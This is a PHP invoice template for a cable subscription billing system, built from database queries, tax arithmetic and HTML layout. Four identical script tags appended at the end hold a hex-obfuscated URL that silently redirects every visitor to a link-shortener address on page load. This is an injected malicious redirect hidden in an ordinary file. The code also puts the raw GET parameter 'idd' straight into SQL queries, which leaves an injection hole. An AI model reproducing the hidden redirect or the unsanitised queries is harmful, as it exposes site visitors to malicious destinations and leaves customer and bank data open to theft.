<?php 
require_once('helper.php');
$id=$_GET['idd'];
$sqlWhere=" ID='$id'";
$sql=$objMisc->getRow('monthly_charges',$sqlWhere);
//echo "SELECT S.STB_NO FROM `subscriptions` S JOIN `stb_box` b ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE B.STB_ID='$sql[stb_id]'";
$BoxNo=$objMisc->GiveValueNew("SELECT S.STB_NO FROM `subscriptions` S JOIN `stb_box` B ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE B.STB_ID='$sql[stb_id]'");
$client=$objMisc->getRow('subscribers'," SUBSCRIBER_ID='$sql[subscriber_id]'");
$packageId=$objMisc->GiveValue(" SUBSCRIBER_ID='$sql[subscriber_id]' AND STB_ID='$sql[stb_id]'",'PACKAGE_ID','stb_box');
$package=$objMisc->GiveValue(" PACKAGE_ID='$packageId'",'NAME','package_master');
$headOfc=$objMisc->getRow('headoffice_master',"HEADOFFICE_ID='$_SESSION[HEADOFFICE]'");
$franOfc=$objMisc->getRow('franchise_master',"FRANCHISE_ID='$client[franchise_id]'");
$invoiceNo=date('my',strtotime($sql['month_date'])).sprintf("%04d", $sno);
$cgst = ($sql['amount']*18)/118/2;
$sgst = ($sql['amount']*18)/118/2;
function numberTowords($num){

	$ones = array(
	0 =>"ZERO",
	1 => "ONE",
	2 => "TWO",
	3 => "THREE",
	4 => "FOUR",
	5 => "FIVE",
	6 => "SIX",
	7 => "SEVEN",
	8 => "EIGHT",
	9 => "NINE",
	10 => "TEN",
	11 => "ELEVEN",
	12 => "TWELVE",
	13 => "THIRTEEN",
	14 => "FOURTEEN",
	15 => "FIFTEEN",
	16 => "SIXTEEN",
	17 => "SEVENTEEN",
	18 => "EIGHTEEN",
	19 => "NINETEEN",
	"014" => "FOURTEEN"
	);
	$tens = array( 
	0 => "ZERO",
	1 => "TEN",
	2 => "TWENTY",
	3 => "THIRTY", 
	4 => "FORTY", 
	5 => "FIFTY", 
	6 => "SIXTY", 
	7 => "SEVENTY", 
	8 => "EIGHTY", 
	9 => "NINETY" 
	); 
	$hundreds = array( 
	"HUNDRED", 
	"THOUSAND", 
	"MILLION", 
	"BILLION", 
	"TRILLION", 
	"QUARDRILLION" 
	); /*limit t quadrillion */
	$num = number_format($num,2,".",","); 
	$num_arr = explode(".",$num); 
	$wholenum = $num_arr[0]; 
	$decnum = $num_arr[1]; 
	$whole_arr = array_reverse(explode(",",$wholenum)); 
	krsort($whole_arr,1); 
	$rettxt = ""; 
	foreach($whole_arr as $key => $i){
		
	while(substr($i,0,1)=="0")
			$i=substr($i,1,5);
	if($i < 20){ 
	/* echo "getting:".$i; */
	$rettxt .= $ones[$i]; 
	}elseif($i < 100){ 
	if(substr($i,0,1)!="0")  $rettxt .= $tens[substr($i,0,1)]; 
	if(substr($i,1,1)!="0") $rettxt .= " ".$ones[substr($i,1,1)]; 
	}else{ 
	if(substr($i,0,1)!="0") $rettxt .= $ones[substr($i,0,1)]." ".$hundreds[0]; 
	if(substr($i,1,1)!="0")$rettxt .= " ".$tens[substr($i,1,1)]; 
	if(substr($i,2,1)!="0")$rettxt .= " ".$ones[substr($i,2,1)]; 
	} 
	if($key > 0){ 
	$rettxt .= " ".$hundreds[$key]." "; 
	}
	} 
	if($decnum > 0){
	$rettxt .= " and ";
	if($decnum < 20){
	$rettxt .= $ones[$decnum];
	}elseif($decnum < 100){
	$rettxt .= $tens[substr($decnum,0,1)];
	$rettxt .= " ".$ones[substr($decnum,1,1)];
	}
	}
	return $rettxt;
}
if($_SESSION['HEADOFFICE']!=1){
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Invoice</title>
</head>
<style>
.main-page{
	width:900px;
	margin:0 auto; 
	font-family:Arial, Helvetica, sans-serif;
	}
	
.logo{
	margin-bottom:15px;
}

.left-div{
	width:50%; 
	float:left;
	}
	
.right-div{
	width:50%; 
	float:left;
}

td.tax {
    color: #2a6282 !important;
    font-size: 20px !important;
    text-align: left !important;
	vertical-align: bottom;
}	

td.copy {
    color: #2a6282 !important;
    font-size: 20px !important;
    text-align: right !important;
}
	
.main-page p{
	font-size:12px;
	line-height:20px;
	padding-top:2px; 
	margin:0 0 10px;
	}	
.main-page h5{
	margin:0; 
	line-height:20px; 
	color:#354f5f;	
	}
	
.table1{
	width:100%;}		
	
.table1 th{
	text-align:left;
	background:#2a6282;
	font-size:14px;
	color:#fff;
	padding:8px 15px;	
	}
	
.table1 td{
	font-size:13px;
	text-align:right;
	}
	
.table1 td span{
	color:#06263a;
	}		
.ship{
	font-size:14px;
	color:#354f5f;
	padding-top:82px;
	}	
	
.font-12{
	font-size:12px;}
	
.mid-table{
	margin-top:15px;
	float:left;
	width:100%;	
	}	
	
.mid-table table{
	font-size:13px;
	width:100%;	
	}	
	
.mid-table table th{
	text-align:right;
	background:#2a6282;
	font-weight:normal;
	color:#fff; 
	font-size:12px; 
	padding:5px 0;
}

.br-bb{
	text-align:right;
	border-right:1px solid #e3e6ea;
	border-bottom:1px solid #e3e6ea;	
}
.mid-table table strong{
color:#417da2;
}	
	
	
.text-right{
	text-align:right !important;}
	
.text-left{
	text-align:left !important;}
	
.pt-8{
	padding-top:8px;}
	
.text-center{
	text-align:center;}	
	
.sign{
	text-align: left;
    border-top: 1px solid #e3e6ea;
    font-weight: bold;
    padding: 10px;
}	

td.copy span {
    font-size: 16px !important;
}	
				
</style>
	<body>
		<div class="main-page">
			<div class="left-div">
		    	<div class="logo"></div>
		        <h5><?php echo  $headOfc['name'];?></h5>
		        <p><?php echo  $headOfc['address'];?><br>
		           <?php echo  $franOfc['phone_no'];?><br>
		           <?php echo  $franOfc['email'];?><br>
		           GSTIN: <?php echo  $franOfc['gstin'];?>&nbsp;&nbsp;PAN:&nbsp;&nbsp;<?php echo  $franOfc['pan'];?><br>
		           Service Tax No.: <?php echo  $franOfc['service_tax_no'];?><br>
		           Website: <?php echo  $franOfc['website'];?>
				</p>
		        <h5>Bill To<br>
		        <?php echo  $client['name'];?></h5>
		        <p><?php echo  $client['name'];?><br>
					<?php echo  $client['address'];?><br>
					<?php echo  $client['email'];?>  <?php echo  $client['phone_no'];?><br>
					<?php echo  (($client['subscriber_gst']=='')?'GSTIN: '.$client['subscriber_gst']:'');?>
		       </p>
		    </div>
		    <div class="right-div">
		    	<table class="table1" border="0" cellspacing="0">
		        	<tr>
		            	<td class="tax">TAX INVOICE</td>
		                <td class="copy"><span>Original Copy</span><br><?php echo ((!empty($sql['receipt_no']))?$sql['receipt_no']:'N/A');?></td>
		            </tr>
		            <tr>
		            	<td>&nbsp;</td>
		            </tr>
		        </table>
		    	<table class="table1" border="0" cellspacing="0">
		          <tr>
		            <th>Amount Due:</th>
		            <th class="text-right"><span>&#2352;</span><?php echo $sql['amount'];?></th>
		          </tr>
		          <tr>
		          	<td>&nbsp;</td>
		          </tr>
		          <tr>
		          	<td><span >Issue Date:</span></td>
		            <td><?php echo $objMisc->DateFormat($sql['month_date']);?></td>
		          </tr>
		          <tr>
		          	<td><span>Due Date:</span></td>
		            <td><?php echo $objMisc->DateFormat($sql['month_date']);?></td>
		          </tr>
		          
		        </table>
		        <table border="0" cellspacing="0">
		          <tr>
		          	<td class="ship"><b>Ship To</b></td>
		          </tr>
		          <tr>
		          	<td class="font-12"><?php echo  $client['address'];?></td>
		          </tr>
		        </table>  
		    </div>
		    <div class="mid-table">
		        <table style="font-size:13px;" border="0" cellspacing="0">
		              <tr>
		                <th class="text-left" style="padding:5px 0 5px 5px;">S.No</th>
		                <th class="text-left">Item Description</th>
		                <th>HSN/SAC</th>
		                <th>Qty UoM</th>
		                <th>Price<span>(&#2352;)</span></th>
		                <th>Taxable Value <span>(&#2352;)</span></th>
		                <th >CGST<span>(&#2352;)</span></th>
		                <th>SGST<span>(&#2352;)</span></th>
		                <th style="padding:5px 5px 5px 0;">Amount<span>(&#2352;)</span></th>
		              </tr>
		               <tr>
		                <td class="br-bb" style="text-align:center;">1</td>
		                <td class="br-bb" style="text-align:left;"><strong><?php echo $package.'<br>('.strtoupper($BoxNo).')';?></strong></td>
		                <td class="br-bb"><?php echo $franOfc['hsn_sac'];?></td>
		                <td class="br-bb">1</td>
		                <td class="br-bb"><?php echo round(($sql['amount']-$sgst-$cgst),2);?></td>
		                <td class="br-bb"><?php echo round(($sql['amount']-$sgst-$cgst),2);?></td>
		                <td class="br-bb"><?php echo round($sgst,2);?><br>9%</td>
		                <td class="br-bb"><?php echo round($cgst,2);?><br>9%</td>
		                <td class="br-bb"><?php echo $sql['amount'];?></td>
		              </tr>
		              <tr>
		              	 <td colspan="4" style="padding-top:8px;">Bank Name: <span style="color:#526069;"><?php echo $franOfc['bank_name'];?></span></td>
		                 <td class="br-bb" style="border-bottom:none;">Total @18%</td>
		                 <td class="br-bb"><?php echo round(($sql['amount']-$sgst-$cgst),2);?></td>
		                 <td class="br-bb"><?php echo round($sgst,2);?></td>
		                 <td class="br-bb"><?php echo round($cgst,2);?></td>
		                 <td class="br-bb"><?php echo $sql['amount'];?></td>
		              </tr>
		               <tr>
		              	 <td colspan="4" class="pt-8">Account Number:<span style="color:#526069;"> <?php echo $franOfc['account_no'];?></span></td>
		                 <td class="text-right pt-8">Total Taxable Value </td>
		                 <td class="text-right" colspan="4">₹<?php echo round(($sql['amount']-$sgst-$cgst),2);?></td>
		              </tr>
		              <tr>
		              	 <td class="pt-8" colspan="6">Branch Name: <span style="color:#526069;"><?php echo $franOfc['branch_name'];?></span></td>

		              </tr>
		              <tr>
		              	 <td colspan="4" class="pt-8">IFSC Code: <span style="color:#526069;"><?php echo $franOfc['ifsc_code'];?></span></td>
		                 <td class="pt-8 text-right">Total Value (in figure)</td>
		                 <td class="text-right" colspan="4">&#2352;<?php echo $sql['amount'];?></td>
		              </tr>
		              <tr>
		              	 <td colspan="5" class="pt-8 text-right">Total Value (in words)</td>
		                 <td colspan="4" class="text-right">&#2352; <?php echo numberTowords($sql['amount']);?></td>
		              </tr>
		              <tr>
		                 <td colspan="9">&nbsp;</td>
		              </tr>
		              <tr>   
		              	 <td colspan="9" style="border-top:1px solid #e3e6ea; padding-top:8px;  text-align:right;"></td>
		              </tr>
		              <tr>
		                 <td colspan="9">&nbsp;</td>
		              </tr>
		               <tr>   
		              	 <td class="text-right " colspan="9"><span class="sign"><?php echo $franOfc['name'];?></span></td>
		              </tr>
		        </table>
		    </div>        
		</div>
	</body>
</html>

<?php
}else{
?>
<page orientation="portrait" backtop="4mm" backbottom="10mm" backleft="7mm" backright="10mm">
	<table border="0" cellspacing="0" cellpadding="0" style="width:680px;margin-bottom:10px;">
		<tr>
			<td style="text-align: left;"><?php if($franOfc['logo1']!=''){ ?><img src="uploads/<?php echo $franOfc['logo1'];?>" style="width:120px;"><?php } ?></td>
			<td style="text-align: right;"><?php if($franOfc['logo2']!=''){ ?><img src="uploads/<?php echo $franOfc['logo2'];?>" style="width:120px;"><?php } ?></td>
		</tr>
		<tr>
			<td colspan="2" style="text-align:center;width:690px;font-size:18px;font-weight:bold;">Tax Invoice<br><br></td>
		</tr>
	</table>
	<table border="0.175" cellspacing="0" cellpadding="0" style="width:710px;">
		<tr>
			<td rowspan="4" valign="top" style="width:321px;padding:5px 5px;">
				<b><?php echo $franOfc['name']?></b><br>
				<?php echo $franOfc['address']?><br>
				Ph. No. <?php echo $franOfc['phone_no']?><br>
				Email <?php echo $franOfc['email']?><br>
				<?php echo (($franOfc['website']!='')?'Email '.$franOfc['website']:'');?>
			</td>
			<td style="width:155px;padding:5px 5px;">Invoice No<br><?php echo $invoiceNo;?></td>
			<td style="width:155px;padding:5px 5px;">Invoice Date<br><?php echo $objMisc->dateFormat($sql['month_date']);?></td>
		</tr>
		<tr>
			<td style="padding:5px 5px;">GST No.</td>
			<td style="padding:5px 5px;"><?php echo $franOfc['gstin'];?></td>
		</tr>
		<tr>
			<td style="padding:5px 5px;">PAN</td>
			<td style="padding:5px 5px;"><?php echo $franOfc['pan'];?></td>
		</tr>
		<tr>
			<td style="padding:5px 5px;">Service Tax No</td>
			<td style="padding:5px 5px;"><?php echo $franOfc['service_tax_no'];?></td>
		</tr>
		<tr>
			<td style="width:321px;padding:5px 5px;">
				<b>Bill To :</b><br>
				<?php echo $client['name'];?><br>
				<?php echo $client['phone_no'];?><br>
				<?php echo $client['email'];?><br>
				<?php echo $client['address'];?> 
				<?php echo (($client['subscriber_gst']!='')?'<br>GST NO. '.$client['subscriber_gst']:'');?> 
			</td>
			<td colspan="2" valign="top" style="padding:5px 5px;"><b>Ship To</b><br><?php echo $client['address'];?></td>
		</tr>
		<!-- <tr>
			<td colspan="3" style="padding:5px 5px;"><?php echo $sql['remarks'];?></td>
		</tr> -->
	</table>
	<table border="0.175" cellspacing="0" cellpadding="0" style="width:710px;">
		<tr>
<!-- 			<td style="width:65px;font-weight:bold;text-align:center;">S.No.</td> -->
			<td style="width:400px;font-weight:bold;text-align:center;">Details</td>
			<td style="width:100px;font-weight:bold;text-align:center;">HSN/SAC</td>
			<td style="width:183px;font-weight:bold;text-align:center;">Amount (INR)</td>
		</tr>
		<?php
		$boxes=$objMisc->getAllRecordsNew("SELECT P.NAME,S.STB_NO,C.AMOUNT FROM `monthly_charges` C JOIN `stb_box` B ON B.`STB_ID`=C.STB_ID JOIN `package_master` P ON P.PACKAGE_ID=B.PACKAGE_ID JOIN `subscriptions` S ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE C.SUBSCRIBER_ID='$sql[subscriber_id]' AND C.AMOUNT_TYPE='D' AND C.STATUS='A' AND MONTH(C.MONTH_DATE)=MONTH('$sql[month_date]') AND YEAR(C.MONTH_DATE)=YEAR('$sql[month_date]')");
		$i=1; 
			$previousMonthDebit=$objMisc->GiveValue("SUBSCRIBER_ID='$sql[subscriber_id]' AND AMOUNT_TYPE='D' AND STATUS='A' AND `ID`<'$id'",'SUM(AMOUNT)','monthly_charges');
			$previousMonthCredit=$objMisc->GiveValue("SUBSCRIBER_ID='$sql[subscriber_id]' AND AMOUNT_TYPE='C' AND STATUS='A' AND `ID`<'$id'",'SUM(AMOUNT)','monthly_charges');
			$previousMonthDiscount=$objMisc->GiveValue("SUBSCRIBER_ID='$sql[subscriber_id]' AND AMOUNT_TYPE='C' AND STATUS='A' AND `ID`<'$id'",'SUM(DISCOUNT)','monthly_charges');
			$previousBalance=$previousMonthDebit-($previousMonthCredit+$sql['amount']+$sql['discount']+$previousMonthDiscount);
	
		foreach ($boxes as $e => $res) {
			$tabDeb.='<tr>
						<!-- <td style="padding:5px;"><?php echo $i;?></td> -->
						<td style="padding:5px;">'.ucwords($res['name']).' For STB No ('.strtoupper($res['stb_no']).')</td>
						<td style="padding:5px;">'.$franOfc['hsn_sac'].'</td>
						<td style="text-align:right;padding:5px;color:red;">Db '.round($res['amount'],2).'</td>
					</tr>';
			$totAmt=$totAmt+$res['amount'];
			$i++;
		}
		$prevBalance=$previousMonthDebit-($previousMonthCredit+$previousMonthDiscount)-$totAmt;
		if($prevBalance!=0){
		?>
		<tr>
			<td style="padding:5px;" colspan="2">Previous Balance</td>
			<td style="text-align:right;padding:5px;"><?php echo round($prevBalance,2);?></td>
		</tr>
		<?php
		} 
		echo $tabDeb;
		?>
		<tr>
			<!-- <td style="padding:5px;"></td> -->
			<td style="padding:5px;" colspan="2">Receipt Amount</td>
			<td style="text-align:right;padding:5px;color:green;">Cr <?php echo round(($sql['amount']-$sql['sgst']-$sql['sgst']),2);?></td>
		</tr>
		<tr>
			<!-- <td style="padding:5px;"></td> -->
			<td style="padding:5px;" colspan="2">SGST @ 9%</td>
			<td style="text-align:right;padding:5px;color:green;">Cr <?php echo round($sql['sgst'],2);?></td>
		</tr>
		<tr>
			<!-- <td style="padding:5px;"></td> -->
			<td style="padding:5px;" colspan="2">CGST @ 9%</td>
			<td style="text-align:right;padding:5px;color:green;">Cr <?php echo round($sql['cgst'],2);?></td>
		</tr>
		<tr>
			<!-- <td style="padding:5px;"></td> -->
			<td style="padding:5px;" colspan="2">Total</td>
			<td style="text-align:right;padding:5px;color:red;"><?php echo round($sql['amount'],2);?></td>
		</tr>
		
	</table><br>
	<?php if($franOfc['bank_name']!=''){ ?>
	<table border="0" cellspacing="0" cellpadding="0" style="width:400px;">
		<tr>
			<td style="width:321px;padding:5px 5px;">
				<b><?php echo 'Bank Name  '.$franOfc['bank_name']?></b><br>
				<b><?php echo 'Account No '.$franOfc['account_no']?></b><br>
				<b><?php echo 'Branch Name '.$franOfc['branch_name']?></b><br>
				<b><?php echo 'IFSC Code '.$franOfc['ifsc_code']?></b><br>
			</td>
		</tr>
	</table><br>
	<?php } ?>
	<table border="0" cellspacing="0" cellpadding="0" style="width:710px;">
		<tr>
			<td style="text-align: center;width:710px;">POWERED BY <img src="images/logo.png" style="width:120px;"><hr></td>
		</tr>
	</table>
</page>
<?php
} ?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>